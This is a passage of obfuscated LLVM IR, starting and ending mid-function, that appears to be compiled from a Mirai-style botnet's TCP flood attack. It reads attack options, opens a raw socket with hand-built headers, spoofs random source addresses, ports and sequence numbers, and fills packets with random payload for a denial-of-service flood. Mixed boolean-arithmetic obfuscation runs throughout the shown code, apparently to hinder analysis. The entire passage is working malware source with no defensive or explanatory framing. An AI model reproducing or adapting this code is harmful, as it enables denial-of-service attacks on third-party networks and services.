  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 1458)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %663

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %663

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %466, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %473

; <label>:123:                                    ; preds = %118
  store i8* getelementptr inbounds ([513 x i8], [513 x i8]* @.str.256, i32 0, i32 0), i8** %31, align 8
  %124 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 512
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 %143, -1
  %145 = xor i8 15, -1
  %146 = xor i8 -62, -1
  %147 = or i8 %144, %145
  %148 = or i8 -62, %146
  %149 = xor i8 %147, -1
  %150 = and i8 %149, %148
  %151 = and i8 %143, 15
  %152 = and i8 %150, 64
  %153 = xor i8 %150, 64
  %154 = or i8 %152, %153
  %155 = or i8 %150, 64
  store i8 %154, i8* %142, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %157 = bitcast %struct.iphdr* %156 to i8*
  %158 = load i8, i8* %157, align 4
  %159 = xor i8 -16, -1
  %160 = xor i8 %158, %159
  %161 = and i8 %160, %158
  %162 = and i8 %158, -16
  %163 = xor i8 %161, -1
  %164 = xor i8 5, -1
  %165 = xor i8 -17, -1
  %166 = and i8 %163, -17
  %167 = and i8 %161, %165
  %168 = and i8 %164, -17
  %169 = and i8 5, %165
  %170 = or i8 %166, %167
  %171 = or i8 %168, %169
  %172 = xor i8 %170, %171
  %173 = or i8 %163, %164
  %174 = xor i8 %173, -1
  %175 = or i8 -17, %165
  %176 = and i8 %174, %175
  %177 = or i8 %172, %176
  %178 = or i8 %161, 5
  store i8 %177, i8* %157, align 4
  %179 = load i8, i8* %12, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 1
  store i8 %179, i8* %181, align 1
  %182 = load i32, i32* %26, align 4
  %183 = sext i32 %182 to i64
  %184 = sub i64 40, 1500538183174367639
  %185 = add i64 %184, %183
  %186 = add i64 %185, 1500538183174367639
  %187 = add i64 40, %183
  %188 = trunc i64 %186 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 2
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %13, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 3
  store i16 %193, i16* %195, align 4
  %196 = load i8, i8* %14, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 5
  store i8 %196, i8* %198, align 4
  %199 = load i8, i8* %15, align 1
  %200 = icmp ne i8 %199, 0
  br i1 %200, label %201, label %205

; <label>:201:                                    ; preds = %123
  %202 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 4
  store i16 %202, i16* %204, align 2
  br label %205

; <label>:205:                                    ; preds = %201, %123
  %206 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 6, i8* %207, align 1
  %208 = load i32, i32* %28, align 4
  %209 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 8
  store i32 %208, i32* %210, align 4
  %211 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %212 = load i32, i32* %9, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i64 %213
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i32 0, i32 1
  %216 = load i32, i32* %215, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 9
  store i32 %216, i32* %218, align 4
  %219 = load i16, i16* %16, align 2
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 0
  store i16 %220, i16* %222, align 4
  %223 = load i16, i16* %17, align 2
  %224 = call zeroext i16 @htons(i16 zeroext %223) #7
  %225 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 1
  store i16 %224, i16* %226, align 2
  %227 = load i32, i32* %18, align 4
  %228 = trunc i32 %227 to i16
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = zext i16 %229 to i32
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 2
  store i32 %230, i32* %232, align 4
  %233 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = xor i16 -241, -1
  %237 = xor i16 %235, %236
  %238 = and i16 %237, %235
  %239 = and i16 %235, -241
  %240 = and i16 %238, 80
  %241 = xor i16 %238, 80
  %242 = or i16 %240, %241
  %243 = or i16 %238, 80
  store i16 %242, i16* %234, align 4
  %244 = load i8, i8* %20, align 1
  %245 = sext i8 %244 to i16
  %246 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 4
  %248 = load i16, i16* %247, align 4
  %249 = xor i16 1, -1
  %250 = xor i16 %245, %249
  %251 = and i16 %250, %245
  %252 = and i16 %245, 1
  %253 = shl i16 %251, 13
  %254 = xor i16 %248, -1
  %255 = xor i16 -8193, -1
  %256 = xor i16 -31486, -1
  %257 = or i16 %254, %255
  %258 = or i16 -31486, %256
  %259 = xor i16 %257, -1
  %260 = and i16 %259, %258
  %261 = and i16 %248, -8193
  %262 = xor i16 %260, -1
  %263 = xor i16 %253, -1
  %264 = xor i16 -21822, -1
  %265 = and i16 %262, -21822
  %266 = and i16 %260, %264
  %267 = and i16 %263, -21822
  %268 = and i16 %253, %264
  %269 = or i16 %265, %266
  %270 = or i16 %267, %268
  %271 = xor i16 %269, %270
  %272 = or i16 %262, %263
  %273 = xor i16 %272, -1
  %274 = or i16 -21822, %264
  %275 = and i16 %273, %274
  %276 = or i16 %271, %275
  %277 = or i16 %260, %253
  store i16 %276, i16* %247, align 4
  %278 = load i8, i8* %21, align 1
  %279 = sext i8 %278 to i16
  %280 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = xor i16 1, -1
  %284 = xor i16 %279, %283
  %285 = and i16 %284, %279
  %286 = and i16 %279, 1
  %287 = shl i16 %285, 12
  %288 = xor i16 %282, -1
  %289 = xor i16 -4097, -1
  %290 = xor i16 -20547, -1
  %291 = or i16 %288, %289
  %292 = or i16 -20547, %290
  %293 = xor i16 %291, -1
  %294 = and i16 %293, %292
  %295 = and i16 %282, -4097
  %296 = and i16 %294, %287
  %297 = xor i16 %294, %287
  %298 = or i16 %296, %297
  %299 = or i16 %294, %287
  store i16 %298, i16* %281, align 4
  %300 = load i8, i8* %22, align 1
  %301 = sext i8 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 4
  %304 = load i16, i16* %303, align 4
  %305 = xor i16 1, -1
  %306 = xor i16 %301, %305
  %307 = and i16 %306, %301
  %308 = and i16 %301, 1
  %309 = shl i16 %307, 11
  %310 = xor i16 %304, -1
  %311 = xor i16 -2049, -1
  %312 = xor i16 17394, -1
  %313 = or i16 %310, %311
  %314 = or i16 17394, %312
  %315 = xor i16 %313, -1
  %316 = and i16 %315, %314
  %317 = and i16 %304, -2049
  %318 = xor i16 %316, -1
  %319 = xor i16 %309, -1
  %320 = xor i16 25907, -1
  %321 = and i16 %318, 25907
  %322 = and i16 %316, %320
  %323 = and i16 %319, 25907
  %324 = and i16 %309, %320
  %325 = or i16 %321, %322
  %326 = or i16 %323, %324
  %327 = xor i16 %325, %326
  %328 = or i16 %318, %319
  %329 = xor i16 %328, -1
  %330 = or i16 25907, %320
  %331 = and i16 %329, %330
  %332 = or i16 %327, %331
  %333 = or i16 %316, %309
  store i16 %332, i16* %303, align 4
  %334 = load i8, i8* %23, align 1
  %335 = sext i8 %334 to i16
  %336 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %337 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %336, i32 0, i32 4
  %338 = load i16, i16* %337, align 4
  %339 = xor i16 1, -1
  %340 = xor i16 %335, %339
  %341 = and i16 %340, %335
  %342 = and i16 %335, 1
  %343 = shl i16 %341, 10
  %344 = xor i16 %338, -1
  %345 = xor i16 -1025, -1
  %346 = xor i16 32362, -1
  %347 = or i16 %344, %345
  %348 = or i16 32362, %346
  %349 = xor i16 %347, -1
  %350 = and i16 %349, %348
  %351 = and i16 %338, -1025
  %352 = xor i16 %350, -1
  %353 = xor i16 %343, -1
  %354 = xor i16 -20011, -1
  %355 = and i16 %352, -20011
  %356 = and i16 %350, %354
  %357 = and i16 %353, -20011
  %358 = and i16 %343, %354
  %359 = or i16 %355, %356
  %360 = or i16 %357, %358
  %361 = xor i16 %359, %360
  %362 = or i16 %352, %353
  %363 = xor i16 %362, -1
  %364 = or i16 -20011, %354
  %365 = and i16 %363, %364
  %366 = or i16 %361, %365
  %367 = or i16 %350, %343
  store i16 %366, i16* %337, align 4
  %368 = load i8, i8* %24, align 1
  %369 = sext i8 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 4
  %372 = load i16, i16* %371, align 4
  %373 = xor i16 %369, -1
  %374 = xor i16 1, -1
  %375 = xor i16 5312, -1
  %376 = or i16 %373, %374
  %377 = or i16 5312, %375
  %378 = xor i16 %376, -1
  %379 = and i16 %378, %377
  %380 = and i16 %369, 1
  %381 = shl i16 %379, 9
  %382 = xor i16 -513, -1
  %383 = xor i16 %372, %382
  %384 = and i16 %383, %372
  %385 = and i16 %372, -513
  %386 = xor i16 %384, -1
  %387 = xor i16 %381, -1
  %388 = xor i16 30948, -1
  %389 = and i16 %386, 30948
  %390 = and i16 %384, %388
  %391 = and i16 %387, 30948
  %392 = and i16 %381, %388
  %393 = or i16 %389, %390
  %394 = or i16 %391, %392
  %395 = xor i16 %393, %394
  %396 = or i16 %386, %387
  %397 = xor i16 %396, -1
  %398 = or i16 30948, %388
  %399 = and i16 %397, %398
  %400 = or i16 %395, %399
  %401 = or i16 %384, %381
  store i16 %400, i16* %371, align 4
  %402 = load i8, i8* %25, align 1
  %403 = sext i8 %402 to i16
  %404 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 4
  %406 = load i16, i16* %405, align 4
  %407 = xor i16 1, -1
  %408 = xor i16 %403, %407
  %409 = and i16 %408, %403
  %410 = and i16 %403, 1
  %411 = shl i16 %409, 8
  %412 = xor i16 -257, -1
  %413 = xor i16 %406, %412
  %414 = and i16 %413, %406
  %415 = and i16 %406, -257
  %416 = xor i16 %414, -1
  %417 = xor i16 %411, -1
  %418 = xor i16 23281, -1
  %419 = and i16 %416, 23281
  %420 = and i16 %414, %418
  %421 = and i16 %417, 23281
  %422 = and i16 %411, %418
  %423 = or i16 %419, %420
  %424 = or i16 %421, %422
  %425 = xor i16 %423, %424
  %426 = or i16 %416, %417
  %427 = xor i16 %426, -1
  %428 = or i16 23281, %418
  %429 = and i16 %427, %428
  %430 = or i16 %425, %429
  %431 = or i16 %414, %411
  store i16 %430, i16* %405, align 4
  %432 = call i32 @rand() #6
  %433 = srem i32 %432, 65535
  %434 = trunc i32 %433 to i16
  %435 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 5
  store i16 %434, i16* %436, align 2
  %437 = load i8, i8* %22, align 1
  %438 = icmp ne i8 %437, 0
  br i1 %438, label %439, label %463

; <label>:439:                                    ; preds = %205
  %440 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 4
  %442 = load i16, i16* %441, align 4
  %443 = xor i16 -2049, -1
  %444 = xor i16 %442, %443
  %445 = and i16 %444, %442
  %446 = and i16 %442, -2049
  %447 = xor i16 %445, -1
  %448 = xor i16 2048, -1
  %449 = xor i16 15536, -1
  %450 = and i16 %447, 15536
  %451 = and i16 %445, %449
  %452 = and i16 %448, 15536
  %453 = and i16 2048, %449
  %454 = or i16 %450, %451
  %455 = or i16 %452, %453
  %456 = xor i16 %454, %455
  %457 = or i16 %447, %448
  %458 = xor i16 %457, -1
  %459 = or i16 15536, %449
  %460 = and i16 %458, %459
  %461 = or i16 %456, %460
  %462 = or i16 %445, 2048
  store i16 %461, i16* %441, align 4
  br label %463

; <label>:463:                                    ; preds = %439, %205
  %464 = load i8*, i8** %31, align 8
  %465 = load i32, i32* %26, align 4
  call void @rand_str(i8* %464, i32 %465)
  br label %466

; <label>:466:                                    ; preds = %463
  %467 = load i32, i32* %9, align 4
  %468 = sub i32 0, %467
  %469 = sub i32 0, 1
  %470 = add i32 %468, %469
  %471 = sub i32 0, %470
  %472 = add nsw i32 %467, 1
  store i32 %471, i32* %9, align 4
  br label %118

; <label>:473:                                    ; preds = %118
  br label %474

; <label>:474:                                    ; preds = %662, %473
  store i32 0, i32* %9, align 4
  br label %475

; <label>:475:                                    ; preds = %656, %474
  %476 = load i32, i32* %9, align 4
  %477 = load i8, i8* %5, align 1
  %478 = zext i8 %477 to i32
  %479 = icmp slt i32 %476, %478
  br i1 %479, label %480, label %662

; <label>:480:                                    ; preds = %475
  %481 = load i8**, i8*** %11, align 8
  %482 = load i32, i32* %9, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds i8*, i8** %481, i64 %483
  %485 = load i8*, i8** %484, align 8
  store i8* %485, i8** %32, align 8
  %486 = load i8*, i8** %32, align 8
  %487 = bitcast i8* %486 to %struct.iphdr*
  store %struct.iphdr* %487, %struct.iphdr** %33, align 8
  %488 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i64 1
  %490 = bitcast %struct.iphdr* %489 to %struct.tcphdr*
  store %struct.tcphdr* %490, %struct.tcphdr** %34, align 8
  %491 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %492 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %491, i64 1
  %493 = bitcast %struct.tcphdr* %492 to i8*
  store i8* %493, i8** %35, align 8
  %494 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %495 = load i32, i32* %9, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %494, i64 %496
  %498 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %497, i32 0, i32 2
  %499 = load i8, i8* %498, align 4
  %500 = zext i8 %499 to i32
  %501 = icmp slt i32 %500, 32
  br i1 %501, label %502, label %527

; <label>:502:                                    ; preds = %480
  %503 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %504 = load i32, i32* %9, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %503, i64 %505
  %507 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %506, i32 0, i32 1
  %508 = load i32, i32* %507, align 4
  %509 = call i32 @ntohl(i32 %508) #7
  %510 = call i32 @rand_next()
  %511 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %512 = load i32, i32* %9, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %511, i64 %513
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i32 0, i32 2
  %516 = load i8, i8* %515, align 4
  %517 = zext i8 %516 to i32
  %518 = lshr i32 %510, %517
  %519 = sub i32 0, %509
  %520 = sub i32 0, %518
  %521 = add i32 %519, %520
  %522 = sub i32 0, %521
  %523 = add i32 %509, %518
  %524 = call i32 @htonl(i32 %522) #7
  %525 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %526 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %525, i32 0, i32 9
  store i32 %524, i32* %526, align 4
  br label %527

; <label>:527:                                    ; preds = %502, %480
  %528 = load i32, i32* %28, align 4
  %529 = icmp eq i32 %528, -1
  br i1 %529, label %530, label %534

; <label>:530:                                    ; preds = %527
  %531 = call i32 @rand_next()
  %532 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 8
  store i32 %531, i32* %533, align 4
  br label %534

; <label>:534:                                    ; preds = %530, %527
  %535 = load i16, i16* %13, align 2
  %536 = zext i16 %535 to i32
  %537 = icmp eq i32 %536, 65535
  br i1 %537, label %538, label %547

; <label>:538:                                    ; preds = %534
  %539 = call i32 @rand_next()
  %540 = xor i32 65535, -1
  %541 = xor i32 %539, %540
  %542 = and i32 %541, %539
  %543 = and i32 %539, 65535
  %544 = trunc i32 %542 to i16
  %545 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %546 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %545, i32 0, i32 3
  store i16 %544, i16* %546, align 4
  br label %547

; <label>:547:                                    ; preds = %538, %534
  %548 = load i16, i16* %16, align 2
  %549 = zext i16 %548 to i32
  %550 = icmp eq i32 %549, 65535
  br i1 %550, label %551, label %564

; <label>:551:                                    ; preds = %547
  %552 = call i32 @rand_next()
  %553 = xor i32 %552, -1
  %554 = xor i32 65535, -1
  %555 = xor i32 -1628522665, -1
  %556 = or i32 %553, %554
  %557 = or i32 -1628522665, %555
  %558 = xor i32 %556, -1
  %559 = and i32 %558, %557
  %560 = and i32 %552, 65535
  %561 = trunc i32 %559 to i16
  %562 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 0
  store i16 %561, i16* %563, align 4
  br label %564

; <label>:564:                                    ; preds = %551, %547
  %565 = load i16, i16* %17, align 2
  %566 = zext i16 %565 to i32
  %567 = icmp eq i32 %566, 65535
  br i1 %567, label %568, label %577

; <label>:568:                                    ; preds = %564
  %569 = call i32 @rand_next()
  %570 = xor i32 65535, -1
  %571 = xor i32 %569, %570
  %572 = and i32 %571, %569
  %573 = and i32 %569, 65535
  %574 = trunc i32 %572 to i16
  %575 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %576 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %575, i32 0, i32 1
  store i16 %574, i16* %576, align 2
  br label %577

; <label>:577:                                    ; preds = %568, %564
  %578 = load i32, i32* %18, align 4
  %579 = icmp eq i32 %578, 65535
  br i1 %579, label %580, label %584

; <label>:580:                                    ; preds = %577
  %581 = call i32 @rand_next()
  %582 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %583 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %582, i32 0, i32 2
  store i32 %581, i32* %583, align 4
  br label %584

; <label>:584:                                    ; preds = %580, %577
  %585 = load i32, i32* %19, align 4
  %586 = icmp eq i32 %585, 65535
  br i1 %586, label %587, label %591

; <label>:587:                                    ; preds = %584
  %588 = call i32 @rand_next()
  %589 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 3
  store i32 %588, i32* %590, align 4
  br label %591

; <label>:591:                                    ; preds = %587, %584
  %592 = load i8, i8* %27, align 1
  %593 = icmp ne i8 %592, 0
  br i1 %593, label %594, label %597

; <label>:594:                                    ; preds = %591
  %595 = load i8*, i8** %35, align 8
  %596 = load i32, i32* %26, align 4
  call void @rand_str(i8* %595, i32 %596)
  br label %597

; <label>:597:                                    ; preds = %594, %591
  %598 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %599 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %598, i32 0, i32 7
  store i16 0, i16* %599, align 2
  %600 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %601 = bitcast %struct.iphdr* %600 to i16*
  %602 = call zeroext i16 @checksum_generic(i16* %601, i32 20)
  %603 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %604 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %603, i32 0, i32 7
  store i16 %602, i16* %604, align 2
  %605 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %606 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %605, i32 0, i32 6
  store i16 0, i16* %606, align 4
  %607 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %608 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %609 = bitcast %struct.tcphdr* %608 to i8*
  %610 = load i32, i32* %26, align 4
  %611 = sext i32 %610 to i64
  %612 = add i64 20, -8330084518712124386
  %613 = add i64 %612, %611
  %614 = sub i64 %613, -8330084518712124386
  %615 = add i64 20, %611
  %616 = trunc i64 %614 to i16
  %617 = call zeroext i16 @htons(i16 zeroext %616) #7
  %618 = load i32, i32* %26, align 4
  %619 = sext i32 %618 to i64
  %620 = add i64 20, 6318670597025327421
  %621 = add i64 %620, %619
  %622 = sub i64 %621, 6318670597025327421
  %623 = add i64 20, %619
  %624 = trunc i64 %622 to i32
  %625 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %607, i8* %609, i16 zeroext %617, i32 %624)
